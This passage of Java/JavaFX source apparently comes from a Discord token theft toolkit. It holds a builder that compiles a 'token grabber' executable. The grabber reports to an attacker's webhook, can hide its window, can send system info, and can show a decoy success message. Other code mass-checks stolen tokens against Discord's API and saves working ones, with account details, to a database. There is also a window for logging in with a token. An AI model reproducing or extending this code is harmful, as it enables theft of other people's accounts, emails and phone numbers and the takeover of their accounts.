	private AnchorPane aprootpane;

	@FXML
	private TextField txttgwebhookutl;

	@FXML
	private CheckBox cbtgdisclaimer;

	@FXML
	private Button btnbuildgrabber;

	@FXML
	private CheckBox cbtghidewindow;

	@FXML
	private CheckBox cbtgsemdsysteminfo;

	@FXML
	private CheckBox cbtgshowsuccessmsg;

	@FXML
	private AnchorPane aptgmsgsettings;

	@FXML
	private TextField txttgmsgtitle;

	@FXML
	private TextField txttgmsgtext;

	@FXML
	private RadioButton cbtgmsgiconwarning;

	@FXML
	private RadioButton cbtgmsgiconinfo;

	@FXML
	private RadioButton cbtgmsgiconerror;

	@FXML
	private RadioButton cbtgmsgiconquestion;

	@FXML
	private RadioButton cbtgmsgiconnone;

	@FXML
	private Button btntgiconbrowse;

	@FXML
	private TextField txttgiconpath;

	@FXML
	private CheckBox cbtgaddicon;

	@FXML
	private Button btntgmsgtest;

	@FXML
	private Menu menfile;

	@FXML
	private Menu mensettings;

	@FXML
	private Menu menhelp;

	@FXML
	private MenuItem menlangenglish;

	@FXML
	private MenuItem menlanggerman;

	@FXML
	private Tab tabgettokeninfo;

	@FXML
	private Tab tabtokenlistchecker;

	@FXML
	private Tab tabgetmytoken;

	@FXML
	private Tab tabbuildtokengrabber;

	@FXML
	private Tab tabtokendatabase;

	@FXML
	private Tab tabtokenstocheck;

	@FXML
	private Tab tabworkingtokens;

	@FXML
	private TitledPane tpadvoptions;

	@FXML
	private TitledPane tpcustomicon;

	@FXML
	private TitledPane tpmessageonsuccess;

	@FXML
	private Menu menlanguage;

	@FXML
	private Menu mendatabase;

	@FXML
	private TextField txtotclidcalc;

	@FXML
	private Button btnotclidcalc;

	@FXML
	private Label lblotclidcalc;
	
	@FXML
	private Label lbldiscordacccreationdatecalculator;
	
	@FXML
	private Label lbldiscordclientid;

	@FXML
	private Tab tabothertools;

	public String readFile(String filename) throws IOException {
		File file = new File(filename);
		return FileUtils.readFileToString(file, StandardCharsets.UTF_8);
	}

	public OkHttpClient client = new OkHttpClient();

	public LinkedList<String> getProxyList() throws Exception {
		// avoid creating several instances, should be singleon
		String prox = "";
		/*
		 * Request request = new Request.Builder() .url(
		 * "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1500&ssl=yes"
		 * ).build(); Response response = client.newCall(request).execute();
		 * 
		 * prox = response.body().string();
		 */

		prox = readFile(startupdir() + File.separator + "proxies.txt");

		LinkedList<String> li = new LinkedList();

		for (String line : prox.split("\\r?\\n")) {
			li.addLast(line);
		}

		return li;
	}

	@FXML
	void btnotclidcalcclick(ActionEvent event) {
		String clientid = txtotclidcalc.getText();

		try {

			ScriptEngine engine = new ScriptEngineManager().getEngineByName("javascript");
			ScriptContext context = engine.getContext();
			StringWriter writer = new StringWriter();
			context.setWriter(writer);

			engine.eval("function convertIDtoUnix(id) {\r\n" + "		/* Note: id has to be str */\r\n"
					+ "		var bin = (+id).toString(2);\r\n" + "		var unixbin = '';\r\n"
					+ "		var unix = '';\r\n" + "		var m = 64 - bin.length;\r\n"
					+ "		unixbin = bin.substring(0, 42-m);\r\n"
					+ "		unix = parseInt(unixbin, 2) + 1420070400000;\r\n" + "		return unix / 1000;\r\n"
					+ "	}" + "function convert(id) {\r\n" + "		var unix = convertIDtoUnix(id.toString());\r\n"
					+ "        \r\n" + "		// Unixtimestamp\r\n" + "		 var unixtimestamp = unix;\r\n"
					+ "		 // Months array\r\n"
					+ "		 var months_arr = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];\r\n"
					+ "		 // Convert timestamp to milliseconds\r\n"
					+ "		 var date = new Date(unixtimestamp*1000);\r\n" + "		 // Year\r\n"
					+ "		 var year = date.getFullYear();\r\n" + "		 // Month\r\n"
					+ "		 var month = months_arr[date.getMonth()];\r\n" + "		 // Day\r\n"
					+ "		 var day = date.getDate();\r\n" + "		 // Hours\r\n"
					+ "		 var hours = date.getHours();\r\n" + "		 // Minutes\r\n"
					+ "		 var minutes = \"0\" + date.getMinutes();\r\n" + "		 // Seconds\r\n"
					+ "		 var seconds = \"0\" + date.getSeconds();\r\n"
					+ "		 // Display date time in MM-dd-yyyy h:m:s format\r\n"
					+ "		 var convdataTime = day+'-'+month+'-'+year+' '+ hours + ':' + minutes.substr(-2) + ':' + seconds.substr(-2);\r\n"
					+ "		 \r\n" + "		return convdataTime;\r\n" + "		\r\n" + "	}" + "print(convert("
					+ clientid + "));");
			String output = writer.toString();
			lblotclidcalc.setText("Account created: " + output);

		} catch (ScriptException e) {
			// TODO Auto-generated catch block
			// e.printStackTrace();
			lblotclidcalc.setText("Account created: ERROR");
		}

	}

	@FXML
	void menlangenglishclick(ActionEvent event) {

		try {
			LANGLOAD("english");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	@FXML
	void menlanggermanclick(ActionEvent event) {

		try {
			LANGLOAD("german");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	@FXML
	void btntgmsgtestclick(ActionEvent event) {

		AlertType at = AlertType.NONE;

		if (cbtgmsgiconwarning.isSelected()) {
			at = AlertType.WARNING;
		}
		if (cbtgmsgiconinfo.isSelected()) {
			at = AlertType.INFORMATION;
		}
		if (cbtgmsgiconerror.isSelected()) {
			at = AlertType.ERROR;
		}
		if (cbtgmsgiconquestion.isSelected()) {
			at = AlertType.CONFIRMATION;
		}
		if (cbtgmsgiconnone.isSelected()) {
			at = AlertType.NONE;

		}

		Alert alert = new Alert(at);
		alert.setTitle(txttgmsgtitle.getText());
		alert.setHeaderText(txttgmsgtitle.getText());
		alert.setContentText(txttgmsgtext.getText());
		if (cbtgmsgiconnone.isSelected()) {
			at = AlertType.NONE;
			ButtonType buttonTypeOK = new ButtonType("OK");
			alert.getButtonTypes().setAll(buttonTypeOK);
		}

		alert.showAndWait();

	}

	@FXML
	void cbtgaddiconclick(ActionEvent event) {
		txttgiconpath.setDisable(!cbtgaddicon.isSelected());
		btntgiconbrowse.setDisable(!cbtgaddicon.isSelected());
	}

	@FXML
	void btntgiconbrowseclick(ActionEvent event) {
		FileChooser fileChooser = new FileChooser();

		// Set extension filter for text files
		FileChooser.ExtensionFilter extFilter = new FileChooser.ExtensionFilter("Icon files (*.ico)", "*.ico");
		fileChooser.getExtensionFilters().add(extFilter);

		// Show open file dialog
		File file = fileChooser.showOpenDialog((Stage) btntgiconbrowse.getScene().getWindow());

		if (file != null) {
			txttgiconpath.setText(file.getAbsolutePath());

		}
	}

	@FXML
	void cbtgshowsuccessmsgclick(ActionEvent event) {
		aptgmsgsettings.setDisable(!cbtgshowsuccessmsg.isSelected());
	}

	@FXML
	void btnbuildgrabberclick(ActionEvent event) {

		String webhookurl = txttgwebhookutl.getText();

		try {
			URL url = new URL(webhookurl);

			if (simpleutils.OperatingSystem.getOS() == simpleutils.OperatingSystem.OS.WINDOWS) {

				LinkedList<String> cmdline = new LinkedList();

				String execompilerPath = startupdir() + File.separator + "data" + File.separator + "grabbercompiler"
						+ File.separator + "TokenGrabberBuilder.exe";

				cmdline.addFirst(execompilerPath);
				cmdline.add("/webhook:\"" + webhookurl + "\"");

				FileChooser choose = new FileChooser();
				choose.getExtensionFilters().add(new FileChooser.ExtensionFilter("Excutable File (*.exe)", "*.exe"));
				choose.setInitialFileName("MyTokenGrabber.exe");
				Stage stage = (Stage) btnbuildgrabber.getScene().getWindow();
				File file = choose.showSaveDialog(stage);
				if (file != null) {
					if (file.getName().endsWith(".exe")) {
						// do the operation with the file (i used a builder)

						cmdline.add("/file:\"" + file.getAbsolutePath() + "\"");

						if (cbtgshowsuccessmsg.isSelected()) {
							cmdline.add("/usesuccessmsg");
							cmdline.add(
									"/msg-title:\"" + simpleutils.Text.Base64encode(txttgmsgtitle.getText()) + "\"");
							cmdline.add(
									"/msg-content:\"" + simpleutils.Text.Base64encode(txttgmsgtext.getText()) + "\"");

							if (cbtgmsgiconwarning.isSelected()) {
								cmdline.add("/msg-style-warning");
							}
							if (cbtgmsgiconinfo.isSelected()) {
								cmdline.add("/msg-style-info");
							}
							if (cbtgmsgiconerror.isSelected()) {
								cmdline.add("/msg-style-error");
							}
							if (cbtgmsgiconquestion.isSelected()) {
								cmdline.add("/msg-style-question");
							}
							if (cbtgmsgiconnone.isSelected()) {
								cmdline.add("/msg-style-none");
							}

						}

						if (cbtghidewindow.isSelected()) {
							cmdline.add("/hidewindow");
						}
						if (cbtgsemdsysteminfo.isSelected()) {
							cmdline.add("/sendsysinfo");
						}

						cmdline.add("/apphostver:" + AppVer);

						if (cbtgaddicon.isSelected() && !txttgiconpath.getText().equals("")) {
							cmdline.add("/icon:\"" + simpleutils.Text.Base64encode(txttgiconpath.getText()) + "\"");
						}

						String pathandargs = execompilerPath + " " + cmdline;
						// System.out.println(pathandargs);

						try {
							ProcessBuilder processBuilder = new ProcessBuilder(cmdline);
							processBuilder.redirectOutput(java.lang.ProcessBuilder.Redirect.PIPE);
							processBuilder.directory(new File(startupdir()));

							Process process = processBuilder.start();
							int waitFlag;

							waitFlag = process.waitFor();
							// Wait to finish application execution.
							if (waitFlag == 0) {

								int returnVal = process.exitValue();

								if (returnVal == 0) {
									Alert alert = new Alert(AlertType.INFORMATION);
									alert.setTitle("Build successed");
									alert.setHeaderText("Build successed");
									alert.setContentText("Your Token Grabber has been successfully built.");
									alert.showAndWait();
								}
								if (returnVal == 1) {
									Alert alert = new Alert(AlertType.ERROR);
									alert.setTitle("Build failed");
									alert.setHeaderText("Build failed");
									alert.setContentText("");
									alert.showAndWait();
								}

							}

						} catch (Exception e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}

					} else {
						Alert alert = new Alert(AlertType.ERROR);
						alert.setTitle("Invalid filename");
						alert.setHeaderText("Invalid filename");
						alert.setContentText(file.getName() + " is not a valid filename.");
						alert.showAndWait();
					}
				}

			} else {
				Alert alert = new Alert(AlertType.ERROR);
				alert.setTitle("Unsupported OS");
				alert.setHeaderText("Unsupported OS");
				alert.setContentText("Only Windows is supported to build grabber");
				alert.showAndWait();
			}

		} catch (MalformedURLException e) {
			// TODO Auto-generated catch block
			Alert alert = new Alert(AlertType.ERROR);
			alert.setTitle("Invalid URL");
			alert.setHeaderText("Invalid URL");
			alert.setContentText("Your entered URL is not valid");
			alert.showAndWait();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	@FXML
	void cbtgdisclaimerclick(ActionEvent event) {

		btnbuildgrabber.setDisable(!cbtgdisclaimer.isSelected());

	}

	@FXML
	void btntokendbrefreshclick(ActionEvent event) {

		db_view();

	}

	public static String getUniqueFileName(String directory, String extension) {
		String fileName = MessageFormat.format("{0}.{1}", java.util.UUID.randomUUID(), extension.trim());
		return Paths.get(directory, fileName).toString();
	}

	Integer addedtokens = 0;
	String tokenlisttodbserverresponse = null;
	Thread addtokentodbthread = null;

	@FXML
	void btntokenlistcheckertokensaveindbclick(ActionEvent event) {

		if (tokencheckerthread.isAlive()) {

			Alert alert = new Alert(AlertType.ERROR);
			alert.setTitle("An another Process is currently running");
			alert.setHeaderText("An another Process is currently running");
			alert.setContentText("Token check process is currently running");
			alert.showAndWait();

		} else {
			if (lvworkingtokens.getItems().size() == 0) {

				Alert alert = new Alert(AlertType.ERROR);
				alert.setTitle("No Tokens to save");
				alert.setHeaderText("No Tokens to save");
				alert.setContentText("The list with working tokens is empty");
				alert.showAndWait();

			} else {
				Task<Void> task = new Task<Void>() {
					@Override
					protected Void call() throws Exception {

						// List<String> tokens;

						List<String> tokens = lvworkingtokens.getItems();

						addedtokens = 0;
						tokenlisttodbserverresponse = "";

						for (String token : tokens) {

							addedtokens++;

							tokenlisttodbserverresponse = getDiscordTokenInfo("https://discord.com/api/v8/users/@me",
									token);

							if (tokencheckserverresponse == null) {

							} else {
								// Platform.runLater(() -> lvworkingtokens.getItems().add(token));

								JSONObject obj = new JSONObject(tokenlisttodbserverresponse);
								String userid = obj.getString("id");
								// System.out.println(userid);

								if (!db_existsdcid(userid)) {

									db_insert(obj.getString("username") + "#" + obj.getString("discriminator"), token,
											obj.getString("id"),
											String.valueOf(java.time.Instant.now().getEpochSecond()),
											String.valueOf(obj.getBoolean("verified")));

								}

							}

							double progress = Double.valueOf(
									String.valueOf(new Expression(addedtokens + " / " + tokens.size()).eval()));

							// Platform.runLater(() -> pbtokenlist.setProgress(50));

							Platform.runLater(() -> statusbartokenschecked.setText(addedtokens + " of " + tokens.size()
									+ " Tokens added to database (" + (progress * 100) + "%)"));

							Platform.runLater(() -> statusbartokenschecked.setProgress(progress));
							// System.out.println(progress + "%");

							if (Thread.interrupted()) {
								// We've been interrupted.

								Platform.runLater(() -> statusbartokenschecked.setText("Aborted."));

								break;

							}

						}

						Platform.runLater(() -> {
							btnchecktokens.setDisable(false);
							statusbartokenschecked.setProgress(100);
							btntokenstocheckclear.setDisable(false);
							// btnabortchecktokens.setDisable(true);
							btntokenstocheckopenfromfile.setDisable(false);
							btntokenlistcheckertokensaveindb.setDisable(false);
							btnclearworkingtokens.setDisable(false);

							Alert alert = new Alert(AlertType.INFORMATION);
							alert.setTitle("Finished");
							alert.setHeaderText("Tokenlist saved in Database!");
							alert.setContentText(addedtokens + " Tokens has added to database");
							alert.showAndWait();

							db_view();

						});

						return null;
					};

				};

				statusbartokenschecked.setText("We are preparing to add the Tokens ...");
				statusbartokenschecked.setProgress(ProgressBar.INDETERMINATE_PROGRESS);
				addtokentodbthread = new Thread(task);
				addtokentodbthread.setDaemon(true);
				addtokentodbthread.start();
				btnchecktokens.setDisable(true);
				btntokenstocheckclear.setDisable(true);
				// btnabortchecktokens.setDisable(false);
				btntokenstocheckopenfromfile.setDisable(true);
				btntokenlistcheckertokensaveindb.setDisable(true);
				btnclearworkingtokens.setDisable(true);
			}

		}

	}

	@FXML
	void tvdbtokenscmcpusernameclick(ActionEvent event) {
		try {
			simpleutils.Clipboard cp = new simpleutils.Clipboard();
			DiscordToken dt = tvdbtokens.getSelectionModel().getSelectedItem();

			cp.SetoClipboardString(dt.getUser());
		} catch (java.lang.NullPointerException ex) {
			Alert alert = new Alert(AlertType.ERROR);
			alert.setTitle("Cannot copy");
			alert.setHeaderText("Cannot copy");
			alert.setContentText("Please select a row");
			alert.showAndWait();
		}

	}

	@FXML
	void tvdbtokenscmcptokenclick(ActionEvent event) {
		try {
			simpleutils.Clipboard cp = new simpleutils.Clipboard();
			DiscordToken dt = tvdbtokens.getSelectionModel().getSelectedItem();

			cp.SetoClipboardString(dt.getToken());

		} catch (java.lang.NullPointerException ex) {
			Alert alert = new Alert(AlertType.ERROR);
			alert.setTitle("Cannot copy");
			alert.setHeaderText("Cannot copy");
			alert.setContentText("Please select a row");
			alert.showAndWait();
		}
	}

	@FXML
	void tvdbtokenscmcpdcuseridclick(ActionEvent event) {
		try {

			simpleutils.Clipboard cp = new simpleutils.Clipboard();
			DiscordToken dt = tvdbtokens.getSelectionModel().getSelectedItem();

			cp.SetoClipboardString(dt.getDiscorduserid());
		} catch (java.lang.NullPointerException ex) {
			Alert alert = new Alert(AlertType.ERROR);
			alert.setTitle("Cannot copy");
			alert.setHeaderText("Cannot copy");
			alert.setContentText("Please select a row");
			alert.showAndWait();
		}
	}

	@FXML
	void tvdbtokenscmgettokeninfoclick(ActionEvent event) {
		try {
			DiscordToken dt = tvdbtokens.getSelectionModel().getSelectedItem();

			tabpanemain.getSelectionModel().select(0); // Select first Tab
			txttoken.setText(dt.getToken());

			btngettokeninfo.fire();

		} catch (java.lang.NullPointerException ex) {
			Alert alert = new Alert(AlertType.ERROR);
			alert.setTitle("Cannot get Token info");
			alert.setHeaderText("Cannot get Token info");
			alert.setContentText("Please select a row");
			alert.showAndWait();
		}
	}

	@FXML
	void tvdbtokenscmclick(ActionEvent event) {
		try {
			DiscordToken dt = tvdbtokens.getSelectionModel().getSelectedItem();

			String dcuserid = dt.getDiscorduserid();

			Alert alert = new Alert(AlertType.CONFIRMATION);
			alert.setTitle("Remove Token from Database?");
			alert.setHeaderText("Remove Token from Database?");
			alert.setContentText(
					"Do you want to delete the Token of \"" + dt.getUser() + "\"?\n THIS ACTION CAN NOT BE UNDONE");

			ButtonType buttonTypeYes = new ButtonType("Delete this Token");

			ButtonType buttonTypeNo = new ButtonType("Cancel");

			alert.getButtonTypes().setAll(buttonTypeYes, buttonTypeNo);

			Optional<ButtonType> result = alert.showAndWait();
			if (result.get() == buttonTypeYes) {

				db_deleteuser(dcuserid);
				db_view();
			}

		} catch (java.lang.NullPointerException ex) {
			Alert alert = new Alert(AlertType.ERROR);
			alert.setTitle("Cannot delete");
			alert.setHeaderText("Cannot delete");
			alert.setContentText("Please select a row");
			alert.showAndWait();
		}
	}

	@FXML
	void mendatabaseresetclick(ActionEvent event) {

		Alert alert = new Alert(AlertType.CONFIRMATION);
		alert.setTitle("Database reset");
		alert.setHeaderText("Reset Database");
		alert.setContentText("Do you want to reset the database. THIS ACTION CAN NOT BE UNDONE");

		ButtonType buttonTypeYes = new ButtonType("Yes, reset Database");
		ButtonType buttonTypeNo = new ButtonType("No");

		alert.getButtonTypes().setAll(buttonTypeYes, buttonTypeNo);

		Optional<ButtonType> result = alert.showAndWait();
		if (result.get() == buttonTypeYes) {
			db_reset();
			Alert alert2 = new Alert(AlertType.INFORMATION);
			alert2.setTitle("Database resetted");
			alert2.setHeaderText("Database resetted");
			alert2.setContentText("Database has now resetted.");
			alert2.showAndWait();
			// System.exit(0);
			db_init();
			db_view();
		}

	}

	@FXML
	void btnaddtokentodbclick(ActionEvent event) {

		if (!db_existsdcid(lastgettokeninfoid)) {

			if (db_insert(lastgettokeninfousername, lastgettokeninfotoken, lastgettokeninfoid,
					String.valueOf(java.time.Instant.now().getEpochSecond()), lastgettokeninfoverified)) {
				Alert alert = new Alert(AlertType.INFORMATION);
				alert.setTitle("Token saved!");
				alert.setHeaderText("Token is now in database");
				alert.setContentText("Token for " + lastgettokeninfousername + " successfully saved in database");
				alert.showAndWait();

				db_view();
			} else {
				Alert alert = new Alert(AlertType.ERROR);
				alert.setTitle("Error saving Token");
				alert.setHeaderText("Error saving Token");
				alert.setContentText("Cannot save token in database.");
				alert.showAndWait();
			}

		} else {
			Alert alert = new Alert(AlertType.WARNING);
			alert.setTitle("Token is already in database");
			alert.setHeaderText("Token is already in database");
			alert.setContentText("Token of user '" + lastgettokeninfousername + "' is already in database");
			alert.showAndWait();

		}

	}

	@FXML
	void btntokeninfologinclick(ActionEvent event) {

		try {
			FXMLLoader fxmlLoader = new FXMLLoader();
			fxmlLoader.setLocation(getClass().getResource("/application/dti_selenium.fxml"));
			/*
			 * if "fx:controller" is not set in fxml
			 * fxmlLoader.setController(NewWindowController);
			 */
			Scene scene = new Scene(fxmlLoader.load());
			Stage stage = new Stage();

			JMetro jMetro = new JMetro(jMetroStyle);
			jMetro.setScene(scene);

			stage.setTitle("Login with Discord Token");
			stage.setScene(scene);
			stage.setResizable(false);
			stage.setOnCloseRequest(e -> e.consume());
			stage.initModality(Modality.APPLICATION_MODAL);
			stage.showAndWait();
		} catch (IOException e) {

			e.printStackTrace();

			Alert alert = new Alert(AlertType.ERROR);
			alert.setTitle("Failed to create new Window.");
			alert.setHeaderText("Failed to create new Window.");
			alert.setContentText(e.getMessage() + "\n" + e.getStackTrace().toString());
			alert.showAndWait();

		}

	}

	@FXML
	void btntokenstocheckopenfromfileclick(ActionEvent event) {

		FileChooser fileChooser = new FileChooser();

		// Set extension filter for text files
		FileChooser.ExtensionFilter extFilter = new FileChooser.ExtensionFilter("TXT files (*.txt)", "*.txt");
		fileChooser.getExtensionFilters().add(extFilter);

		// Show open file dialog
		File file = fileChooser.showOpenDialog((Stage) btnworkingtokenssavetofile.getScene().getWindow());

		if (file != null) {

			String openstring = "";

			FileInputStream fis;
			try {
				fis = new FileInputStream(file);

				int r = 0;

				while ((r = fis.read()) != -1) {
					openstring = openstring + (char) r; // prints the content of the file
					// System.out.print((char)r);
				}

			} catch (IOException e) {
				// TODO Auto-generated catch block
				Platform.runLater(() -> {
					Alert alert = new Alert(AlertType.ERROR);
					alert.setTitle("Error reading file");
					alert.setHeaderText("Error reading file");
					alert.setContentText(e.getMessage());
					alert.showAndWait();
				});
				// e.printStackTrace();
			} // opens a connection to an actual file

			txttokenstocheck.setText(openstring);

		}

	}

	@FXML
	void btnworkingtokensgetinfoclick(ActionEvent event) {
		tabpanemain.getSelectionModel().select(0); // Select first Tab
		txttoken.setText(lvworkingtokens.getSelectionModel().getSelectedItem());
		btngettokeninfo.fire();
	}

	@FXML
	void btnworkingtokenscopyselectedclick(ActionEvent event) {
		simpleutils.Clipboard clipboard = new simpleutils.Clipboard();

		clipboard.SetoClipboardString(lvworkingtokens.getSelectionModel().getSelectedItem());
	}

	@FXML
	void btnworkingtokenssavetofileclick(ActionEvent event) {
		// btnworkingtokenssavetofile.

		if (lvworkingtokens.getItems().size() == 0) {

			Alert alert = new Alert(AlertType.ERROR);
			alert.setTitle("No Tokens to save");
			alert.setHeaderText("No Tokens to save");
			alert.setContentText("The list with working tokens is empty");
			alert.showAndWait();

		} else {

			FileChooser fileChooser = new FileChooser();

			// Set extension filter for text files
			FileChooser.ExtensionFilter extFilter = new FileChooser.ExtensionFilter("TXT files (*.txt)", "*.txt");
			fileChooser.getExtensionFilters().add(extFilter);

			// Show save file dialog
			File file = fileChooser.showSaveDialog((Stage) btnworkingtokenssavetofile.getScene().getWindow());

			if (file != null) {

				String savestring = lvworkingtokens.getItems().stream().map(Object::toString)
						.collect(java.util.stream.Collectors.joining(System.lineSeparator()));

				saveTextToFile(savestring, file);
			}

		}
	}

	private void saveTextToFile(String content, File file) {
		try {
			PrintWriter writer;
			writer = new PrintWriter(file);
			writer.println(content);
			writer.close();
		} catch (IOException ex) {

		}
	}

	@FXML
	void btntokenstocheckclearcheck(ActionEvent event) {
		txttokenstocheck.setText("");
	}

	private int checkedtokens = 0;
	private int workingtokens = 0;
	private int notworkingtokens = 0;
	private String tokencheckserverresponse;
	private Thread tokencheckerthread;

	@FXML
	void btngetyourtokencopyselectedclick(ActionEvent event) {
		simpleutils.Clipboard clipboard = new simpleutils.Clipboard();

		clipboard.SetoClipboardString(lvtokensfound.getSelectionModel().getSelectedItem());
	}

	@FXML
	void btnchecktokensclick(ActionEvent event) {

		Task<Void> task = new Task<Void>() {
			@Override
			protected Void call() throws Exception {

				// List<String> tokens;

				String[] tokens = txttokenstocheck.getText().split("\n");

				checkedtokens = 0;

				workingtokens = 0;
				notworkingtokens = 0;
				for (String token : tokens) {

					checkedtokens++;

					tokencheckserverresponse = getDiscordTokenInfo("https://discord.com/api/v8/users/@me", token);

					if (tokencheckserverresponse == null) {
						notworkingtokens++;
					} else {
						Platform.runLater(() -> lvworkingtokens.getItems().add(token));
						workingtokens++;
					}

					double progress = Double
							.parseDouble(String.valueOf(new Expression(checkedtokens + " / " + tokens.length).eval()));

					// Platform.runLater(() -> pbtokenlist.setProgress(50));

					Platform.runLater(() -> statusbartokenschecked.setText(
							checkedtokens + " of " + tokens.length + " Tokens checked (" + Math.round(progress * 100)
									+ "%) (working: " + workingtokens + "; not working: " + notworkingtokens + ")"));

					Platform.runLater(() -> statusbartokenschecked.setProgress(progress));
					// System.out.println(progress + "%");

					if (Thread.interrupted()) {
						// We've been interrupted.

						Platform.runLater(() -> statusbartokenschecked.setText("Aborted."));

						break;

					}

				}

				Platform.runLater(() -> {
					btnchecktokens.setDisable(false);
					statusbartokenschecked.setProgress(100);
					btntokenstocheckclear.setDisable(false);
					btnabortchecktokens.setDisable(true);
					btntokenstocheckopenfromfile.setDisable(false);

					Alert alert = new Alert(AlertType.INFORMATION);
					alert.setTitle("Finished");
					alert.setHeaderText("Tokenlist check finished!");
					alert.setContentText(
							"Working Tokens: " + workingtokens + "\n" + "Not working Tokens: " + notworkingtokens);
					alert.showAndWait();

				});

				return null;
			};

		};

		statusbartokenschecked.setText("We are preparing to check the Tokens ...");
		statusbartokenschecked.setProgress(ProgressBar.INDETERMINATE_PROGRESS);
		tokencheckerthread = new Thread(task);
		tokencheckerthread.setDaemon(true);
		tokencheckerthread.start();
		btnchecktokens.setDisable(true);
		btntokenstocheckclear.setDisable(true);
		btnabortchecktokens.setDisable(false);
		btntokenstocheckopenfromfile.setDisable(true);
	}

	@FXML
	void btnclearworkingtokensclick(ActionEvent event) {
		lvworkingtokens.getItems().clear();

		btnworkingtokenscopyselected.setDisable(true);
		btnworkingtokensgetinfo.setDisable(true);
	}

	@FXML
	void btnabortchecktokensclick(ActionEvent event) {
		tokencheckerthread.interrupt();
		btnabortchecktokens.setDisable(true);
	}

	@FXML
	void btngetmytokenclick(ActionEvent event) {
		Grabber grabber = new Grabber();
		grabber.debug = false;
		List<String> tokens = grabber.getTokens(false);

		lvtokensfound.getItems().clear();
		btngettokeninfoselectedtoken.setDisable(true);
		btngetyourtokencopyselected.setDisable(true);

		if (!tokens.isEmpty()) {
			for (String token : tokens) {
				lvtokensfound.getItems().add(token);

			}
		} else {
			Alert alert = new Alert(AlertType.INFORMATION);
			alert.setTitle("No Tokens found");
			alert.setHeaderText("No Tokens found");
			alert.setContentText(
					"No tokens were found in this user profile. If you recently installed Discord, it may take a few days for Tokens to be found.");
			alert.showAndWait();
		}

	}

	@FXML
	void btngettokeninfoselectedtokenclick(ActionEvent event) {

		tabpanemain.getSelectionModel().select(0); // Select first Tab
		txttoken.setText(lvtokensfound.getSelectionModel().getSelectedItem());
		btngettokeninfo.fire();
	}

	private String jsonstrNSFW = "(not set)";
	private String jsonstrNitro = "Not a Nitro Subscriber";
	private String jsonstrPublicFlags_formatted = "(not set)";
	private String jsonstrAccCreated = "Unknown";
	private String jsonstrEmail = "(not set)";
	private String jsonstrPhone = "(not set)";
	private String jsonstrAvatar = null;
	private Image jsonimage = null;
	public static String lastgettokeninfotoken = "";
	public static String lastgettokeninfoid = "";
	public static String lastgettokeninfousername = "";
	public static String lastgettokeninfoverified = "";

	@FXML
	void btngettokeninfoclick(ActionEvent event) {
		String token = txttoken.getText();
		lastgettokeninfotoken = token;
		lastgettokeninfoid = "";
		lastgettokeninfousername = "";
		lastgettokeninfoverified = "";

		panetokeninfodetails.setVisible(false);
		progbarloading.setVisible(true);

		jsonstrNSFW = "(not set)";
		jsonstrNitro = "Not a Nitro Subscriber";
		jsonstrPublicFlags_formatted = "(not set)";
		jsonstrAccCreated = "Unknown";
		jsonstrEmail = "(not set)";
		jsonstrPhone = "(not set)";
		jsonstrAvatar = null;
		jsonimage = null;

		Task<Void> task = new Task<Void>() {
			@Override
			protected Void call() {

				String serverresponse;
				try {
					serverresponse = getDiscordTokenInfo("https://discord.com/api/v8/users/@me", token);

					if (serverresponse == null) {

						Platform.runLater(() -> {

							Alert alert = new Alert(AlertType.ERROR);
							alert.setTitle("Error getting informations");
							alert.setHeaderText("Cannot get informations");
							alert.setContentText("This token is not valid");
							alert.showAndWait();

							panetokeninfodetails.setVisible(false);

						});

					} else {

						// System.out.println("DEBUG:" serverresponse);

						JSONObject obj = new JSONObject(serverresponse);
						String jsonstrToken = token;
						String jsonstrUsername = obj.getString("username");
						String jsonstrDiscriminator = obj.getString("discriminator");
						String jsonstrId = obj.getString("id");
						// String jsonstrAvatar = obj.getString("avatar");
						Integer jsonstrPublicFlags = obj.getInt("public_flags");
						Integer jsonstrFlags = obj.getInt("flags");
						String jsonstrBio = obj.getString("bio");
						String jsonstrLocale = obj.getString("locale");
						Boolean jsonstrMFAenabled = obj.getBoolean("mfa_enabled");
						// String jsonstrEmail = obj.getString("email");
						// String jsonstrPhone = obj.getString("phone");
						Boolean jsonstrVerified = obj.getBoolean("verified");

						String jsonstrVerified_formatted;
						String jsonstrMFAenabled_formatted;

						if (Boolean.TRUE.equals(jsonstrVerified)) {
							jsonstrVerified_formatted = "Yes";
						} else {
							jsonstrVerified_formatted = "No";
						}

						if (Boolean.TRUE.equals(jsonstrMFAenabled)) {
							jsonstrMFAenabled_formatted = "Enabled";
						} else {
							jsonstrMFAenabled_formatted = "Disabled";
						}
						// NSFW
						try {

							if (obj.has("nsfw_allowed")) {

								if (Boolean.TRUE.equals(obj.getBoolean("nsfw_allowed"))) {
									jsonstrNSFW = "Yes";
								} else {
									jsonstrNSFW = "No";
								}

							}

						} catch (Exception ex) {

						}
						// Phone
						try {

							jsonstrPhone = obj.getString("phone");

						} catch (Exception ex) {

						}
						// Avatar
						try {

							jsonstrAvatar = obj.getString("avatar");

						} catch (Exception ex) {

						}
						// E-Mail
						try {

							jsonstrEmail = obj.getString("email");

						} catch (Exception ex) {

						}

						// Discord NITRO
						try {

							if (obj.has("premium_type")) {

								switch (obj.getInt("premium_type")) {
								case 0:
									jsonstrNitro = "Not a Nitro subscriber";
									break;
								case 1:
									jsonstrNitro = "Nitro Classic subscriber";
									break;
								case 2:
									jsonstrNitro = "Nitro subscriber";
									break;
								}

							}

						} catch (Exception ex) {

						}

						switch (jsonstrPublicFlags) {
						case 1:
							jsonstrPublicFlags_formatted = "Discord Employee";
							break;
						case 2:
							jsonstrPublicFlags_formatted = "Partnered Server Owner";
							break;
						case 4:
							jsonstrPublicFlags_formatted = "HypeSquad Events";
							break;
						case 8:
							jsonstrPublicFlags_formatted = "Bug Hunter Level 1";
							break;
						case 64:
							jsonstrPublicFlags_formatted = "House Bravery";
							break;
						case 128:
							jsonstrPublicFlags_formatted = "House Brilliance";
							break;
						case 256:
							jsonstrPublicFlags_formatted = "House Balance";
							break;
						case 512:
							jsonstrPublicFlags_formatted = "Early Supporter";
							break;
						case 16384:
							jsonstrPublicFlags_formatted = "Bug Hunter Level 2";
							break;
						case 131072:
							jsonstrPublicFlags_formatted = "Early Verified Bot Developer";
							break;
						default:
